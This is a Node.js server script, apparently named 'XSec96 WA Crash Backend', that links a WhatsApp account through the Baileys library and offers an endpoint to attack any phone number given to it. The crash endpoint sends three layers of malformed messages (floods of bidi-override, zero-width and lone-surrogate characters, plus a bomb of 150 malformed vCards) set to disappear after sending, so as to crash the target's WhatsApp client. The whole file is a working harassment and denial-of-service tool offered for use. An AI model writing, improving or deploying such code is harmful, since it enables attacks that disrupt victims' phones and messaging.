/**
 * XSec96 WA Crash Backend
 * Railway deployment — Node.js + Baileys
 *
 * Endpoints:
 *   GET  /              → health check
 *   POST /api/init      → generate QR + pairing code
 *   GET  /api/status    → cek status koneksi
 *   POST /api/crash     → kirim crash payload
 *   POST /api/reset     → reset session
 */

const express = require('express');
const cors = require('cors');
const QRCode = require('qrcode');
const makeWASocket = require('@whiskeysockets/baileys').default;
const {
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');

const app = express();
const logger = pino({ level: 'silent' });
const PORT = process.env.PORT || 3000;

const SESSION_DIR = '/tmp/wa_session_xsec';
const RECONNECT_MAX = 3;

app.use(cors());
app.use(express.json());

// ============================================================
// GLOBAL STATE
// ============================================================
let sock = null;
let currentQR = null;
let currentPairingCode = null;
let isConnected = false;
let senderNumber = null;
let reconnectAttempts = 0;

// ============================================================
// PAYLOAD BUILDERS
// ============================================================
function buildInvisibleCrashPayload() {
  const bombs = [];
  const overrides = ['\u202A', '\u202B', '\u202C', '\u202D', '\u202E'];
  for (let i = 0; i < 800; i++) bombs.push(overrides[i % overrides.length]);

  const zw = ['\u200B', '\u200C', '\u200D', '\u2060', '\uFEFF'];
  for (let i = 0; i < 600; i++) bombs.push(zw[i % zw.length]);

  for (let i = 0; i < 400; i++) {
    bombs.push(String.fromCharCode(0xD800 + (i % 0x7FF)));
  }

  const invis = ['\u2061', '\u2062', '\u2063', '\u2064', '\u206A', '\u206B', '\u206C', '\u206D', '\u206E', '\u206F'];
  for (let i = 0; i < 300; i++) bombs.push(invis[i % invis.length]);

  bombs.push('\uD83D\uDE00'.repeat(100));
  bombs.push('\uD83D'.repeat(50));
  bombs.push('\uDC00'.repeat(50));

  return bombs.join('') + ' XSEC_INVISIBLE_CRASH '.repeat(30);
}

function buildVCardCrashPayload() {
  const contacts = [];
  for (let i = 0; i < 150; i++) {
    const crashName = '\u202E'.repeat(50) + '\uD800'.repeat(20) + 'XSEC'.repeat(20);
    const crashNumber = '9'.repeat(80);
    contacts.push({
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${crashName};;;\nFN:${crashName}\nTEL;type=CELL;type=VOICE;waid=${crashNumber}:+${crashNumber}\nEND:VCARD`,
      displayName: crashName
    });
  }
  return {
    displayName: '\u202E' + 'XSEC_CRASH'.repeat(50),
    contacts
  };
}

function buildSecondaryBomb() {
  return '\u202E'.repeat(2000) + '\uD800'.repeat(500) + '\u200B'.repeat(500);
}

// ============================================================
// SOCKET INIT
// ============================================================
async function initSocket(number) {
  if (sock) {
    try { sock.end(undefined); } catch (e) {}
    sock = null;
  }

  if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger)
    },
    printQRInTerminal: false,
    logger,
    browser: ['XSec', 'Chrome', '1.0.0'],
    generateHighQualityLinkPreview: false,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    syncFullHistory: false,
    markOnlineOnConnect: false,
    fireInitQueries: false,
    getMessage: async () => undefined
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
      currentQR = qr;
      console.log('[XSec] QR generated');
    }

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      isConnected = false;
      console.log('[XSec] Connection closed:', statusCode);

      if (shouldReconnect && reconnectAttempts < RECONNECT_MAX) {
        reconnectAttempts++;
        setTimeout(() => initSocket(number).catch(() => {}), 3000);
      }
    } else if (connection === 'open') {
      isConnected = true;
      currentQR = null;
      currentPairingCode = null;
      senderNumber = number;
      reconnectAttempts = 0;
      console.log('[XSec] CONNECTED!');
    }
  });

  try {
    if (!sock.authState.creds.registered) {
      await new Promise(r => setTimeout(r, 2000));
      const code = await sock.requestPairingCode(number.replace(/[^0-9]/g, ''));
      currentPairingCode = code;
      console.log('[XSec] Pairing code:', code);
    }
  } catch (e) {
    console.error('[XSec] Pairing code error:', e.message);
  }

  return sock;
}

// ============================================================
// ENDPOINTS
// ============================================================

// Health check
app.get('/', (req, res) => {
  res.json({
    status: 'ok',
    service: 'xsec-wa-backend',
    timestamp: new Date().toISOString()
  });
});

// ===== INIT =====
app.post('/api/init', async (req, res) => {
  const { number } = req.body;
  if (!number || number.length < 8) {
    return res.status(400).json({ error: 'INVALID_NUMBER' });
  }

  console.log('[XSec] Init request:', number);

  currentQR = null;
  currentPairingCode = null;
  isConnected = false;
  senderNumber = number;

  try {
    await initSocket(number);

    let waited = 0;
    while (!currentQR && waited < 10000) {
      await new Promise(r => setTimeout(r, 500));
      waited += 500;
    }

    if (!currentQR) {
      return res.status(500).json({
        error: 'QR_TIMEOUT',
        pairingCode: currentPairingCode
      });
    }

    const qrDataUrl = await QRCode.toDataURL(currentQR, {
      width: 300,
      margin: 2,
      color: { dark: '#000000', light: '#ffffff' }
    });

    return res.json({
      status: 'qr_ready',
      qr: qrDataUrl,
      pairingCode: currentPairingCode,
      senderNumber: number
    });

  } catch (e) {
    console.error('[XSec] Init error:', e.message);
    return res.status(500).json({ error: e.message });
  }
});

// ===== STATUS =====
app.get('/api/status', (req, res) => {
  res.json({
    connected: isConnected,
    hasQR: !!currentQR,
    pairingCode: currentPairingCode,
    senderNumber
  });
});

// ===== CRASH =====
app.post('/api/crash', async (req, res) => {
  const { target } = req.body;
  if (!target || target.length < 8) {
    return res.status(400).json({ error: 'INVALID_TARGET' });
  }

  if (!isConnected || !sock) {
    return res.status(503).json({ error: 'SENDER_NOT_LINKED' });
  }

  const cleanTarget = target.replace(/[^0-9]/g, '');
  const jid = `${cleanTarget}@s.whatsapp.net`;

  console.log('[XSec] Crash target:', jid);

  const results = { layers: [], errors: [] };

  try {
    const p1 = buildInvisibleCrashPayload();
    await sock.sendMessage(jid, { text: p1 }, { ephemeralExpiration: 1 });
    results.layers.push({ layer: 1, type: 'invisible_text', size: p1.length });
  } catch (e) {
    results.errors.push({ layer: 1, error: e.message });
  }

  try {
    const vc = buildVCardCrashPayload();
    await sock.sendMessage(jid, { contacts: vc }, { ephemeralExpiration: 1 });
    results.layers.push({ layer: 2, type: 'vcard_bomb', count: vc.contacts.length });
  } catch (e) {
    results.errors.push({ layer: 2, error: e.message });
  }

  try {
    const p3 = buildSecondaryBomb();
    await sock.sendMessage(jid, { text: p3 }, { ephemeralExpiration: 1 });
    results.layers.push({ layer: 3, type: 'secondary_bomb', size: p3.length });
  } catch (e) {
    results.errors.push({ layer: 3, error: e.message });
  }

  return res.json({
    success: results.layers.length > 0,
    deliveredTo: jid,
    senderSafe: true,
    layers: results.layers,
    errors: results.errors
  });
});

// ===== RESET =====
app.post('/api/reset', async (req, res) => {
  try {
    if (sock) {
      await sock.logout().catch(() => {});
      sock = null;
    }
  } catch (e) {}

  isConnected = false;
  currentQR = null;
  currentPairingCode = null;
  senderNumber = null;

  return res.json({ success: true });
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
  console.log(`[XSec] Server running on port ${PORT}`);
});
